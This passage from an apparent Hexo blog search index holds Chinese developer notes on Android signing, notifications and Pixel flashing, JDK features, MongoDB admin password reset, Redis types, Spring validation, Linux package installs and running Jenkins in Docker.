，两者可以相互收发数据。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"串口","slug":"串口","permalink":"http://yoursite.com/tags/串口/"}]},{"title":"Android JKS证书升级","slug":"Android/Android JKS证书升级","date":"2020-04-20T11:52:36.000Z","updated":"2021-12-28T03:24:10.087Z","comments":true,"path":"Android/Android JKS证书升级/","link":"","permalink":"http://yoursite.com/Android/Android JKS证书升级/","excerpt":"","text":"用Android Studio 3.5创建了JKS证书，提示以下警告： 1JKS 密钥库使用专用格式。建议使用 &quot;keytool -importkeystore -srckeystore D:\\demo\\project\\app\\key.jks -destkeystore D:\\demo\\project\\app\\key.jks -deststoretype pkcs12&quot; 迁移到行业标准格式 PKCS12。 按照上面的提示，执行命令:12345678$ keytool -importkeystore -srckeystore D:\\\\demo\\\\project\\\\app\\\\key.jks -destkeystore D:\\\\demo\\\\project\\\\app\\\\key.jks -deststoretype pkcs12输入源密钥库口令:已成功导入别名 myapp 的条目。已完成导入命令: 1 个条目成功导入, 0 个条目失败或取消Warning:已将 \"D:\\demo\\project\\app\\key.jks\" 迁移到 Non JKS/JCEKS。将 JKS 密钥库作为 \"D:\\demo\\project\\app\\key.jks.old\" 进行了备份。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"jks","slug":"jks","permalink":"http://yoursite.com/tags/jks/"}]},{"title":"Android 帧动画","slug":"Android/Android 帧动画","date":"2020-04-20T01:52:36.000Z","updated":"2021-12-28T03:24:10.106Z","comments":true,"path":"Android/Android 帧动画/","link":"","permalink":"http://yoursite.com/Android/Android 帧动画/","excerpt":"","text":"/drawable/start.xml12345&lt;animation-list xmlns:android=\"http://schemas.android.com/apk/res/android\" android:oneshot=\"false\"&gt; &lt;item android:drawable=\"@drawable/img1\" android:duration=\"200\" /&gt; &lt;item android:drawable=\"@drawable/img2\" android:duration=\"100\" /&gt;&lt;/animation-list&gt; android:oneshot=”false” 表示一直播放（循环） 设置为background12345&lt;ImageView android:id=\"@+id/image\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:background=\"@drawable/start\" /&gt; 启动动画12val image = findViewById&lt;ImageView&gt;(R.id.image)(image.background as AnimationDrawable).start()","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"动画","slug":"动画","permalink":"http://yoursite.com/tags/动画/"}]},{"title":"Android Notifications通知兼容性","slug":"Android/Android Notifications通知兼容性","date":"2020-03-17T14:21:36.000Z","updated":"2021-12-28T03:24:10.097Z","comments":true,"path":"Android/Android Notifications通知兼容性/","link":"","permalink":"http://yoursite.com/Android/Android Notifications通知兼容性/","excerpt":"","text":"notifications docs notifications 兼容性 请尽量使用：NotificationCompat 及其子类，以及 NotificationManagerCompat。这样一来，您就无需编写条件代码来检查 API 级别，因为这些 API 会为您代劳。但是要注意 NotificationManagerCompat 不能创建Android8.0以上所需要的Channel，创建Channel还是需要用NotificationManager。 简单的一个通知1234567891011String channelId = \"news\"; NotificationCompat.Builder builder = new NotificationCompat.Builder(getApplicationContext(), channelId) .setSmallIcon(R.mipmap.ic_launcher) .setContentTitle(\"测试Title\") .setContentText(\"一些简单的内容！！！\"); NotificationManagerCompat notificationManager = NotificationManagerCompat.from(getApplicationContext()); int notifyId = 123; notificationManager.notify(notifyId, builder.build()); 但这个通知在Android8.0不能发出去，因为8.0规定必须将单个通知放入特定Channel中。 兼容Android8.0的通知先 创建 NotificationChannel ，才能发出 Notification 。 12345678910111213141516171819202122232425262728293031323334353637NotificationManager manager = (NotificationManager) context.getSystemService( Context.NOTIFICATION_SERVICE); String channelId = String.valueOf(notifyId); if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123; // 创建Channel NotificationChannel channel = new NotificationChannel(channelId, \"警报通知\", NotificationManager.IMPORTANCE_HIGH); channel.enableLights(true); channel.setLightColor(ContextCompat.getColor(context, R.color.notifyChannel)); channel.setShowBadge(true); channel.setDescription(\"警报\"); manager.createNotificationChannel(channel); &#125; NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(context, channelId); mBuilder.setContentTitle(title) .setContentText(msg) //这张图显示在右边，原图显示 .setLargeIcon(BitmapFactory.decodeResource(context.getResources(), R.drawable.notification_image)) .setOnlyAlertOnce(true) .setDefaults(Notification.DEFAULT_ALL) .setWhen(System.currentTimeMillis()) //这有一种颜色 + 透明部分 .setSmallIcon(R.drawable.notification_icon) .setColor(ContextCompat.getColor(context, R.color.notifySmallIcon)); mBuilder.setAutoCancel(true); // 用 NotificationManager 发通知 // manager.notify(notifyId, mBuilder.build()); // 用 NotificationManagerCompat 发通知兼容性更好 NotificationManagerCompat notificationManager = NotificationManagerCompat.from(context); notificationManager.notify(notifyId, mBuilder.build()); notification_icon notification_image Genymotion模拟器显示效果这里不测试国内的定制 ROM 效果，每个ROM都有自己的优化。 1. Android 4.4（API 级别 19 和 20） 2. Android 5.0（API 级别 21） setSmallIcon的图标是镂空的，单色。 引入了锁定屏幕和浮动通知。 向 API 集添加了通知是否在锁定屏幕上显示的方法 (setVisibility())，以及指定通知文本的“公开”版本的方法。 单色Icon示例，白色部分是透明 2. Android 6.0（API 级别 23） 3. Android 7.0（API 级别 24） 重新设计了通知模板的样式，以强调主打图像和头像。 4. Android 8.0（API 级别 26） 现在必须将单个通知放入特定渠道中。 用户现在可以按渠道关闭通知，而不是关闭应用的所有通知。 4. Android 9.0（API 级别 28） 从通知启动 Activitydocs","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"通知,notify","slug":"通知-notify","permalink":"http://yoursite.com/tags/通知-notify/"}]},{"title":"JDK 14 新特性","slug":"Java/JDK 14 新特性","date":"2020-03-17T01:51:41.000Z","updated":"2021-12-30T08:21:19.075Z","comments":true,"path":"Java/JDK 14 新特性/","link":"","permalink":"http://yoursite.com/Java/JDK 14 新特性/","excerpt":"","text":"2020年3月17日 JDK 14 发布，非 LTS 版本。 新特性 305: Pattern Matching for instanceof (Preview) 343: Packaging Tool (Incubator) 345: NUMA-Aware Memory Allocation for G1 349: JFR Event Streaming 352: Non-Volatile Mapped Byte Buffers 358: Helpful NullPointerExceptions 359: Records (Preview) 361: Switch Expressions (Standard) 362: Deprecate the Solaris and SPARC Ports 363: Remove the Concurrent Mark Sweep (CMS) Garbage Collector 364: ZGC on macOS 365: ZGC on Windows 366: Deprecate the ParallelScavenge + SerialOld GC Combination 367: Remove the Pack200 Tools and API 368: Text Blocks (Second Preview) 370: Foreign-Memory Access API (Incubator) 中文 305: instanceof的模式匹配 (预览) 343: 打包工具 (Incubator) 345: G1的NUMA内存分配优化 349: JFR事件流 352: 非原子性的字节缓冲区映射 358: 友好的空指针异常 359: Records (预览) 361: Switch表达式扩展 (标准) 362: 弃用Solaris和SPARC端口 363: 移除CMS（Concurrent Mark Sweep）垃圾收集器 364: macOS系统上的ZGC 365: Windows系统上的ZGC 366: 弃用ParallelScavenge + SerialOld GC组合 367: 移除Pack200 Tools和API 368: 文本块 (第二个预览版) 370: 外部存储器API (Incubator) 123456789if (o instanceof String) &#123; String s = (String)o; ... use s ...&#125;// New codeif (o instanceof String s) &#123; ... use s ...&#125; 12345678910111213141516171819202122232425// instanceof 太多static String formatter(Object o) &#123; String formatted = \"unknown\"; if (o instanceof Integer i) &#123; formatted = String.format(\"int %d\", i); &#125; else if (o instanceof Long l) &#123; formatted = String.format(\"long %d\", l); &#125; else if (o instanceof Double d) &#123; formatted = String.format(\"double %f\", d); &#125; else if (o instanceof String s) &#123; formatted = String.format(\"String %s\", s); &#125; return formatted;&#125;// 用switchstatic String formatterPatternSwitch(Object o) &#123; return switch (o) &#123; case Integer i -&gt; String.format(\"int %d\", i); case Long l -&gt; String.format(\"long %d\", l); case Double d -&gt; String.format(\"double %f\", d); case String s -&gt; String.format(\"String %s\", s); default -&gt; o.toString(); &#125;;&#125; 参考","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"MongoDb忘记管理员密码","slug":"Web后端/MongoDb忘记管理员密码","date":"2020-03-08T01:52:36.000Z","updated":"2021-12-28T03:24:10.205Z","comments":true,"path":"Web后端/MongoDb忘记管理员密码/","link":"","permalink":"http://yoursite.com/Web后端/MongoDb忘记管理员密码/","excerpt":"","text":"忘记管理员密码对于创建数据库等操作会有影响，本文基于Mongo v3.4.10将做一次处理这个问题的示例，整体方向就是删除所有的管理员用户，重新创建。 关闭mongod的认证 12#security:# authorization: enabled 重启mongod 1$ service mongod restart 登录mongo命令行,删除所有admim数据库中的账号 1234$ mongo&gt; use admin &gt; db.system.users.find()&gt; db.system.users.remove(&#123;&#125;) 创建超级管理员root 1&gt; db.createUser(&#123;user:&apos;root&apos;,pwd:&apos;123456&apos;,roles:[&#123;&quot;role&quot;:&quot;root&quot;,&quot;db&quot;:&quot;admin&quot;&#125;]&#125;) 验证root密码 1&gt; db.auth(&apos;root&apos;,&apos;123456&apos;) 创建一个示例数据库：testdb 1&gt; use testdb 为示例数据库：testdb 创建一个可读写的用户 db.createUser(&#123;user:'testuser',pwd:'123456',roles:[&#123;\"role\":\"readWrite\",\"db\":\"testdb\"&#125;]&#125;)12```8. 认证 db.auth(‘testuser’,’123456a’)19. 在testdb的col(collection)插入一条数据（不然不会创建数据库） db.col.insert({‘test’:’123’})12310. 开启认证去掉 security:authorization: enabled注释,重启mongod11. 与mongo同一台机器安装adminMongo $ git clone https://github.com/mrvautin/adminMongo.git$ cd adminMongo$ npm install$ vim /config/app.json{ “app”: { “host”: “0.0.0.0”, “port”: 4321, “docs_per_page”: 20, “password”: “adm123”, “locale”: “en”, “context”: “dbApp”, “monitoring”: true }}$ npm start1212. IP：port 访问adminMongo，密码是app.json中设置的密码12. adminMongo 用超级用户创建连接 mongodb://root:123456@127.0.0.1:27017` 在adminMongo中试一下创建数据库，为数据库创建用户等操作，完成。","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"用 Google Pixel 刷机示例","slug":"Android/用 Google Pixel 刷机示例","date":"2020-03-01T01:52:36.000Z","updated":"2021-12-28T03:24:10.127Z","comments":true,"path":"Android/用 Google Pixel 刷机示例/","link":"","permalink":"http://yoursite.com/Android/用 Google Pixel 刷机示例/","excerpt":"","text":"fastboot常用命令1234567891011# 解锁$ fastboot flashing unlock# 重启$ fastboot reboot# 刷入recovery$ fastboot flash recovery recovery.img# 启动临时recovery$ fastboot boot recovery.img Pixel解Bootloader锁想要刷ROM，解BL锁时第一步： 在Android系统设置选项的开发者中，打开调试模式，打开OEM解锁，连接数据线。 关机 长按 “音量-“ + “电源”按键，进入Bootloader fastboot flashing unlock命令解锁 (需要有platform-tools才能运行fastboot) 如果成功就重启 fastboot reboot 注意：解锁之后，Pixel在每次开机都会提示不安全，可以不要管。解锁之后，不要再上锁，特别是ROOT之后，上锁就进不了系统，手机变砖。 Pixel刷Recovery示例刷个第三方的Recovery，就可以为所欲为了，TWRP是强大的Recovery。 下载twrp根据手机的设备代号下载相关的twrp包，如Pixel是sailfish,下载 .img 和 .zip 两个包。 刷入临时twrp.img 12345$ fastboot flash recovery twrp-3.3.1-0-sailfish.imgSending &apos;recovery&apos; (31092 KB) OKAY [ 0.793s]Writing &apos;recovery&apos; (bootloader) Flashing active slot &quot;_b&quot;FAILED (remote: &apos;partition [recovery] doesn&apos;t exist&apos;)Finished. Total time: 1.008s 进入临时twrp.img 1234$ fastboot boot twrp-3.3.1-0-sailfish.imgDownloading &apos;boot.img&apos; OKAY [ 0.721s]booting OKAY [ 1.011s]Finished. Total time: 1.765s 安装正式twrp.zip 123451. 这时候是可以通过电脑访问存储的，将twrp.zip包放到内部存储下2. 进入临时的twrp，使用“安装”，将twrp.zip刷到手机上。3. 进入twrp的“清理”格式化data（否则内部存储无法写）4. 重启5. 进入TWRP Recovery 注意：一般手机是”音量+” + “电源”按键进入Recovery，但我这里的Pixel无法进入，可以先进入Bootloader，通过音量键选择菜单 Recovery Mod，这样才进去TWRP 刷ROM到这里就可以开始刷机了，这里刷机都是指“卡刷”，意思是通过将ROM拷贝到内部存储(sdcard)，再通过Recovery将ROM安装到手机。 Pixel是Google亲儿子系列， 可以通过Google官方下载渠道下载，里面会有GMS依赖，但是系统会比较新，如Pixel的Android10都出来了 另外刷机都是选择第三方ROM： Lineage OS （国内有镜像） Resurrection Remix OS （国内无法下载，除非在网盘有找到这些ROM） Carbon OS 这些第三方ROM支持的机型比较广泛，可以查自己的型号。 这里刷的是 Lineage OS，在国内镜像下载了Pixel的ROM包，拷贝到内部存储(sdcard),在TWRP的“安装”选中ROM包，安装即可，如果开机停留在首屏动画，在TWRP格式化一下data就行。 基于Lineage OS的ROOT在 Lineage OS国内镜像 下载 addonsu-14.1-arm64-signed.zip 通过TWRP刷一下就OK了，顺便也可以刷一下 Magisk-v20.3.zip ,这个是管理ROOT的。 效果图","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"Pixel","slug":"Pixel","permalink":"http://yoursite.com/tags/Pixel/"}]},{"title":"Genymotion更改模拟器的存放路径","slug":"Android/genymotion更改模拟器的存放路径","date":"2020-01-10T11:52:36.000Z","updated":"2021-12-28T03:24:10.122Z","comments":true,"path":"Android/genymotion更改模拟器的存放路径/","link":"","permalink":"http://yoursite.com/Android/genymotion更改模拟器的存放路径/","excerpt":"","text":"Genymotion模拟器下载的虚拟机默认是在C盘，如果要修改虚拟机的路径，在设置里修改即可，但是先存的虚拟机genymotion不会帮你移动。 我们手动移动虚拟机，比如移动到D盘，那这些的虚拟机都失效了，Genymotion并不支持导入。 修改 C:\\Users\\用户名.VirtualBox\\VirtualBox.xml 文件 : 123456&lt;MachineRegistry&gt; &lt;MachineEntry uuid=\"&#123;a9a20fe7-dc69-4869-8f8b-1feff2485745&#125;\" src=\"D:\\GenymotionDevice\\Google Pixel - 9.0\\Google Pixel - 9.0.vbox\"/&gt; &lt;MachineEntry uuid=\"&#123;a9a20fe7-dc69-4869-8f8b-1feff2485745&#125;\" src=\"D:\\GenymotionDevice\\Google Pixel - 8.0\\Google Pixel - 8.0.vbox\"/&gt;&lt;/MachineRegistry&gt; 将路径改正确即可，如果不小心删掉了，也可以在xml里面增加一个item，按照他的格式来写，其中uuid在虚拟机的vbox文件里面可以找到。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"genymotion","slug":"genymotion","permalink":"http://yoursite.com/tags/genymotion/"}]},{"title":"Android获取签名的指纹","slug":"Android/Android获取签名的指纹","date":"2019-12-12T01:52:36.000Z","updated":"2019-12-12T01:52:36.000Z","comments":true,"path":"Android/Android获取签名的指纹/","link":"","permalink":"http://yoursite.com/Android/Android获取签名的指纹/","excerpt":"","text":"签名的指纹在对接一些平台会用到，如微信，高德等。 很久没用，忘记了，这里记录一下，方便以后使用 命令1$ keytool -list -v -keystore 签名文件 Debug默认的签名Android Studio的默认Debug签名是在用户的 .android 目录中（如Windows下的：C:\\Users\\sam.android），文件名为 debug.keystore 12$ keytool -list -v -keystore debug.keystore输入密钥库口令: (密码是android) 自定义签名现在自定义签名是 *.jks 文件,这里为你打包apk所用的签名12345678910111213141516171819202122232425262728293031323334353637383940414243$ keytool -list -v -keystore alis.jks输入密钥库口令: (密码是自己设的)密钥库类型: jks密钥库提供方: SUN您的密钥库包含 1 个条目别名: honor创建日期: 2019-12-12条目类型: PrivateKeyEntry证书链长度: 1证书[1]:所有者: CN=Dog, OU=Teng, O=GouQuan, L=Beijing, ST=China, C=CHN发布者: CN=Dog, OU=Teng, O=GouQuan, L=Beijing, ST=China, C=CHN序列号: 5647d295有效期为 Thu Dec 12 10:51:28 CST 2019 至 Mon Dec 05 10:51:28 CST 2044证书指纹: MD5: 6F:7F:E4:86:BC:F7:B4:F2:2E:B0:87:FA:8B:2E:06:99 SHA1: 48:93:C4:B5:E7:CB:1B:49:EA:B5:A6:08:C9:B1:8D:FC:5E:CB:A8:74 SHA256: 9E:28:9C:8F:A0:01:F7:55:B8:CA:0B:30:6D:B6:10:16:B5:E5:88:72:E5:31:60:6E:F5:25:C3:B5:09:A3:5D:13签名算法名称: SHA256withRSA主体公共密钥算法: 2048 位 RSA 密钥版本: 3扩展:#1: ObjectId: 2.5.29.14 Criticality=falseSubjectKeyIdentifier [KeyIdentifier [0000: 3F F7 B4 C9 12 3F 34 F9 DB FF 27 E5 A0 6C B7 25 ?....?4...'..l.%0010: E1 C0 06 72 ...r]]**************************************************************************************Warning:JKS 密钥库使用专用格式。建议使用 \"keytool -importkeystore -srckeystore alis.jks -destkeystore alis.jks -deststoretype pkcs12\" 迁移到行业标准格式 PKCS12 。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/tags/Android/"}]},{"title":"redis五种数据类型整理","slug":"Web后端/redis五种数据类型整理","date":"2019-11-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.215Z","comments":true,"path":"Web后端/redis五种数据类型整理/","link":"","permalink":"http://yoursite.com/Web后端/redis五种数据类型整理/","excerpt":"","text":"为了方便复习redis的数据类型，根据网络文章整理一份。 一、Redis 字符串(String)字符串类型是最基础的类型，在redis里面字符串可以存储3中类型的值，字节串、整数、浮点数。这里整数或者浮点数是可以执行自增或自减的。使用场景： 计数 分布式锁 缓存数据 二、Redis 列表(List)列表类似于数据结构的链表，可以给定int范围去显示这个列表中的数据。列表允许用户从序列的两端推入或者弹出元素，获取列表元素。列表的一个主要优点在于他可以包含多个字符串值，而且都集中在一个区域，而且多个字符串是可以重复的。使用场景： 存储任务信息 最近浏览过的文章 联系人信息 消息队列 三、Redis 哈希(Hash)redis的哈希可以存储多个键值对之间的映射。哈希在很多方面就像一个微缩版的redis，不少字符串命令都有相应的哈希版本。一个key name的哈希中，有多个key-value对。我们可以把这种数据聚集看做是关系库中的行。使用场景： 存储对象(频繁增删) 购物车 关系数据库的缓存 四、Redis 集合(Set)redis的集合以无序的方式来“存储多个各不相同”的元素，用户可以快速地对集合执行“添加元素”操作、“移除元素”操作以及“检查一个元素是否存在”于集合中。集合跟列表不同之处在于，列表可以存储多个相同的字符串，而集合则通过使用Hash来保证存储的字符串各不相同（这些Hash只有key，并没有与key相关联的value）。使用场景： 计算交集、并集、差集 共同好友 利用唯一性,统计访问网站的所有独立IP 好友推荐时,根据tag求交集,大于某个阈值就可以推荐 五、Redis 有序集合(sorted set)“有序集合”相比“集合”多出一个分值（score），分值必须为浮点数。有序集合既可以根据成员访问，又可以根据分值或分值的排列顺序来访问的结构。使用场景： 排行榜 带权重的消息队列 内容来自： Redis 数据类型 | 菜鸟教程 Redis五种数据类型","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://yoursite.com/tags/redis/"}]},{"title":"JetBrains系列IDE设置注释不顶格","slug":"IDE/JetBrains系列IDE设置注释不顶格","date":"2019-11-29T13:52:36.000Z","updated":"2021-12-28T03:24:10.135Z","comments":true,"path":"IDE/JetBrains系列IDE设置注释不顶格/","link":"","permalink":"http://yoursite.com/IDE/JetBrains系列IDE设置注释不顶格/","excerpt":"","text":"JetBrains系列IDE 用 Ctrl + / 注释一行代码时， 默认 // 注释符会出现在顶格，如何取消？ java设置注释不顶行 kotlin设置注释不顶行 注释效果","categories":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/categories/IDE/"}],"tags":[]},{"title":"SpringBoot注解@Validated表单校验","slug":"SpringBoot/SpringBoot注解@Validated表单校验","date":"2019-10-30T11:52:36.000Z","updated":"2021-12-28T03:24:10.194Z","comments":true,"path":"SpringBoot/SpringBoot注解@Validated表单校验/","link":"","permalink":"http://yoursite.com/SpringBoot/SpringBoot注解@Validated表单校验/","excerpt":"","text":"Spring3支持JSR-303验证框架，JSR-303 是Java EE 6 中的一项子规范，叫做BeanValidation，官方参考实现是hibernate Validator（与Hibernate ORM 没有关系），JSR 303 用于对Java Bean 中的字段的值进行验证。 1. 表单属性123456@Datapublic class User &#123; @NotBlank(message = \"name不能为空\") private String name;&#125; 2. Controller中开启验证1234567import org.springframework.validation.annotation.Validated;@PostMapping(\"/register\") public ResponseEntity&lt;Void&gt; register(@Validated User user) &#123; return ResponseEntity.noContent().build(); &#125; 或者1234567import javax.validation.Valid;@PostMapping(\"/register\") public ResponseEntity&lt;Void&gt; register(@Valid User user) &#123; return ResponseEntity.noContent().build(); &#125; 3. 处理异常12345678910111213141516171819202122//@Validated校验的异常@ExceptionHandler(MethodArgumentNotValidException.class)public ResponseEntity&lt;String&gt; handleValidException(MethodArgumentNotValidException e)&#123; return bindingResultToMsg(e.getBindingResult());&#125;//@Valid校验的异常@ExceptionHandler(BindException.class)public ResponseEntity&lt;String&gt; handleValidException(BindException e)&#123; return bindingResultToMsg(e.getBindingResult());&#125;private ResponseEntity&lt;String&gt; bindingResultToMsg(BindingResult result)&#123; List&lt;ObjectError&gt; errors = result.getAllErrors(); StringBuffer errorMsg = new StringBuffer(); errors.forEach(x -&gt; errorMsg.append(x.getDefaultMessage()).append(\";\")); return ResponseEntity .status(200) .body(errorMsg.toString());&#125; 4. 前端提交表单针对 register(@Validated User user) 的表单提交，支持 Params 和 multipart/form-data ，不支持 Content-Type: application/json 的Body提交方式。 5. 支持Body提交加上 @RequestBody 注解即可。 1234567import javax.validation.Valid;@PostMapping(\"/register\") public ResponseEntity&lt;Void&gt; register(@RequestBody @Valid User user) &#123; return ResponseEntity.noContent().build(); &#125; 完整校验注解 @Length(min=, max=) 属性（String） 检查字符串长度是否符合范围 列长度会被设到最大值 @Max(value=) 属性（以 numeric 或者 string 类型来表示一个数字） 检查值是否小于或等于最大值 对列增加一个检查约束 @Min(value=) 属性（以 numeric 或者 string 类型来表示一个数字） 检查值是否大于或等于最小值 对列增加一个检查约束 @NotNull 属性 检查值是否非空（not null） @Past 属性（date 或 calendar） 检查日期是否是过去时 对列增加一个检查约束 @Future 属性（date 或 calendar） 检查日期是否是将来时 @Pattern(regex=”regexp”, flag=) 属性（string） 检查属性是否与给定匹配标志的正则表达式相匹配（见 java.util.regex.Pattern ） @Range(min=, max=) 属性（以 numeric 或者 string 类型来表示一个数字） 检查值是否在最小和最大值之间（包括临界值） 对列增加一个检查约束 @Size(min=, max=) 属性（array，collection，map） 检查元素大小是否在最小和最大值之间（包括临界值） @AssertFalse 属性 检查方法的演算结果是否为 false（对以代码方式而不是注解表示的约束很有用） @AssertTrue 属性 检查方法的演算结果是否为 true（对以代码方式而不是注解表示的约束很有用） @Valid 属性（object） 对关联对象递归进行验证。如果对象是集合或数组，就递归地验证其元素；如果对象是 Map，则递归验证其值元素 @Email 属性（String） 检查字符串是否符合有效的 email 示例： 12345@Size(max = 30, min = 4, message = &quot;密码长度只能在4-30之间&quot;)private String password;// 密码@Pattern(regexp = &quot;^1[35678]\\\\d&#123;9&#125;$&quot;,message = &quot;手机号格式不正确&quot;)private String phone;// 电话","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://yoursite.com/categories/SpringBoot/"}],"tags":[]},{"title":"CentOS7配置IPV4静态网络","slug":"Linux/CentOS7配置IPV4静态网络","date":"2019-10-18T11:53:36.000Z","updated":"2021-12-28T03:24:10.161Z","comments":true,"path":"Linux/CentOS7配置IPV4静态网络/","link":"","permalink":"http://yoursite.com/Linux/CentOS7配置IPV4静态网络/","excerpt":"","text":"在VM虚拟机中NAT网络转为桥接，客户机CentOS则要改为静态IP，下面是操作日志。 ens33是默认的网卡，我们就修改这个网卡。修改内容 设置一个静态IP、网关 启动IPV4，关闭IPV6 1234567# 图形编辑$ nmtui edit ens33# 等同于编辑文件$ vi /etc/sysconfig/network-scripts/ifcfg-ens33$ service network restart","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[]},{"title":"CentOS安装OpenJDK","slug":"Linux/CentOS安装OpenJDK","date":"2019-10-18T11:52:36.000Z","updated":"2021-12-28T03:24:10.162Z","comments":true,"path":"Linux/CentOS安装OpenJDK/","link":"","permalink":"http://yoursite.com/Linux/CentOS安装OpenJDK/","excerpt":"","text":"卸载CentOS会自带OpenJDK，卸载自带的OpenJDK，再安装我们需要的版本123456789$ rpm -qa | grep jdkjava-11-openjdk-headless-11.0.4.11-1.el7_7.x86_64java-1.8.0-openjdk-headless-1.8.0.222.b10-0.el7_6.x86_64copy-jdk-configs-3.3-10.el7_5.noarch$ rpm -e --nodeps java-1.8.0-openjdk-headless-1.8.0.222.b10-0.el7_6.x86_64$ rpm -e --nodeps java-11-openjdk-headless-11.0.4.11-1.el7_7.x86_64$ rpm -e --nodeps copy-jdk-configs-3.3-10.el7_5.noarch 搜索1$ yum search openjdk | grep -i --color openjdk 安装123456789# 安装java8$ yum install java-1.8.0-openjdk java-1.8.0-openjdk-devel# 安装java11$ yum install java-11-openjdk java-11-openjdk-devel$ java -versionopenjdk version \"11.0.4\" 2019-07-16 LTSOpenJDK Runtime Environment 18.9 (build 11.0.4+11-LTS)OpenJDK 64-Bit Server VM 18.9 (build 11.0.4+11-LTS, mixed mode, sharing)","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[]},{"title":"Ubuntu安装Nodejs","slug":"Linux/Ubuntu安装NodeJS","date":"2019-10-18T11:52:36.000Z","updated":"2021-12-28T03:24:10.178Z","comments":true,"path":"Linux/Ubuntu安装NodeJS/","link":"","permalink":"http://yoursite.com/Linux/Ubuntu安装NodeJS/","excerpt":"","text":"Ubuntu默认安装的Nodejs版本都是比较低的（差很多），无法编译Vue，所以要安装最新版本。思路是先安装旧版本，再升级到最新版本。 安装12345678910# 1. 先安装旧版$ sudo apt install -y nodejs npm# 2. 换源$ sudo npm config set registry https://registry.npm.taobao.org# 3. 安装工具 n (管理 node 版本)$ sudo npm install n -g# 4. node升级安装最新版本$ sudo n stable# 5. npm升级安装最新版本(要先升级node再升级npm)$ sudo npm install -g npm","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"nodejs,npm","slug":"nodejs-npm","permalink":"http://yoursite.com/tags/nodejs-npm/"}]},{"title":"Ubuntu安装OpenJDK","slug":"Linux/Ubuntu安装OpenJDK","date":"2019-10-18T11:52:36.000Z","updated":"2021-12-28T03:24:10.178Z","comments":true,"path":"Linux/Ubuntu安装OpenJDK/","link":"","permalink":"http://yoursite.com/Linux/Ubuntu安装OpenJDK/","excerpt":"","text":"安装123456789101112131415$ sudo add-apt-repository ppa:openjdk-r/ppa$ sudp apt-get update# 安装java8$ sudo apt-get install openjdk-8-jdk# 安装java11$ sudo apt-get install openjdk-11-jdk$ java -versionopenjdk version \"11.0.8\" 2020-07-14OpenJDK Runtime Environment (build 11.0.8+10-post-Ubuntu-0ubuntu118.04.1)OpenJDK 64-Bit Server VM (build 11.0.8+10-post-Ubuntu-0ubuntu118.04.1, mixed mode, sharing)","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[]},{"title":"Gradle国内cdn","slug":"IDE/Gradle国内cdn","date":"2019-10-17T12:52:36.000Z","updated":"2021-12-28T03:24:10.133Z","comments":true,"path":"IDE/Gradle国内cdn/","link":"","permalink":"http://yoursite.com/IDE/Gradle国内cdn/","excerpt":"","text":"gradle在中国有cdn了: 修改 gradle-wrapper.properties 中的 services.gradle.org 为 downloads.gradle-dn.com","categories":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/categories/IDE/"}],"tags":[]},{"title":"八、Docker-部署Jenkins","slug":"docker/八、Docker-部署Jenkins","date":"2019-09-17T11:58:36.000Z","updated":"2021-12-28T03:24:10.225Z","comments":true,"path":"docker/八、Docker-部署Jenkins/","link":"","permalink":"http://yoursite.com/docker/八、Docker-部署Jenkins/","excerpt":"","text":"【参考】 1. 简单1$ sudo docker run -p 8080:8080 -p 50000:50000 -u 0 jenkins/jenkins:lts -u 0 :表示已root账号启动镜像（镜像内部使用的用户是 jenkins ） 2. 带jenkins_home1$ sudo docker run -p 8080:8080 -p 50000:50000 -v jenkins_home:/var/jenkins_home jenkins/jenkins:lts 3. docker-compose配置文件123456789101112131415version: '3.3'services: jenkins: image: jenkins/jenkins:lts restart: always user: root ports: - '8080:8080' - '50000:50000' volumes: - '/usr/jenkins/jenkins_home:/var/jenkins_home' - '/usr/bin/docker:/usr/bin/docker' - '/var/run/docker.sock:/var/run/docker.sock' - '/etc/localtime:/etc/localtime:ro' 日志：12345678910111213141516jenkins_1 | INFO: jenkins_1 | jenkins_1 | *************************************************************jenkins_1 | *************************************************************jenkins_1 | *************************************************************jenkins_1 | jenkins_1 | Jenkins initial setup is required. An admin user has been created and a password generated.jenkins_1 | Please use the following password to proceed to installation:jenkins_1 | jenkins_1 | e526cf02d4bb4c3b9e91df6dea9bdda5jenkins_1 | jenkins_1 | This may also be found at: /var/jenkins_home/secrets/initialAdminPasswordjenkins_1 | jenkins_1 | *************************************************************jenkins_1 | *************************************************************jenkins_1 | ************************************************************* 密码路径：/var/jenkins_home/secrets/initialAdminPassword","categories":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/categories/Docker/"}],"tags":[]},{"title":"JDK 13 新特性","slug":"Java/JDK 13 新特性","date":"2019-09-17T01:51:41.000Z","updated":"2021-12-30T09:00:54.786Z","comments":true,"path":"Java/JDK 13 新特性/","link":"","permalink":"http://yoursite.com/Java/JDK 13 新特性/","excerpt":"","text":"2019年09月17日 JDK 13 发布，非 LTS 版本。 新特性 350: 